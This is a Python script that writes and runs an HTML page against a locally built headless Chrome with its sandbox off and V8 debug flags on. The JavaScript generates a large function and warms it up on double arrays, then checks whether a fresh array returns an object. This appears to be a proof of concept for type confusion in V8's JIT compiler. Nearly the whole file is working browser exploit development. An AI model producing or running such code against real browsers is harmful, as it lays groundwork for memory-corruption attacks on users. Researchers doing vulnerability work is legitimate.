import subprocess

html = """<!DOCTYPE html><html><body><script>
let dummy = { a: 1 };

function create_and_warmup() {
  let lines = [];
  lines.push("function sink_cond(x, arr, obj, limit) {");
  for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
  
  lines.push("  arr[0] = obj;");
  lines.push("  let i = 0;");
  lines.push("  let res = null;");
  lines.push("  let dummy_var = 0;");
  lines.push("  while ((res = arr[1]) !== null && i < limit) {");
  for (let j = 0; j < 80; j++) {
    lines.push(`    dummy_var = (dummy_var + ${j}) | 0;`);
  }
  lines.push("    i++;");
  lines.push("  }");
  lines.push("  return res;");
  lines.push("}");
  lines.push("return sink_cond;");
  let fn = new Function(lines.join("\\n"))();
  
  // Allocate pool of 1200 double arrays (no GC!)
  let pool = [];
  for (let i = 0; i < 1200; i++) {
    pool.push([1.1, 2.2, 3.3]);
  }
  
  // Warmup with transition every time
  for (let i = 0; i < 1200; i++) {
    fn(1000, pool[i], dummy, 1);
  }
  return fn;
}

async function main() {
  let fn = create_and_warmup();
  await new Promise(r => setTimeout(r, 600));
  
  let victim = [1.1, 2.2, 3.3];
  let res = fn(1000, victim, dummy, 1);
  console.log("RESULT: type=" + (typeof res) + " val=" + res);
  if (typeof res === "object") {
    console.log("🔥🔥🔥 SINKHOLE SUCCESS! Object:", res, "🔥🔥🔥");
  } else {
    console.log("Result is still:", res);
  }
}
main();
</script></body></html>"""

with open("script/cond_sink.html", "w") as f:
    f.write(html)

cmd = [
    "./script/candidate/chrome/chrome",
    "--headless=new",
    "--no-sandbox",
    "--disable-gpu",
    "--disable-dev-shm-usage",
    "--enable-logging=stderr",
    "--js-flags=--no-memory-protection-keys --expose-cage-base --trace-maglev --trace-opt",
    "http://127.0.0.1:8000/cond_sink.html"
]
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
try:
    out, _ = p.communicate(timeout=6)
except subprocess.TimeoutExpired:
    p.kill()
    out, _ = p.communicate()

for l in out.splitlines():
    if any(k in l for k in ["RESULT", "SUCCESS", "compil", "sink_cond", "Still"]):
        print(l)
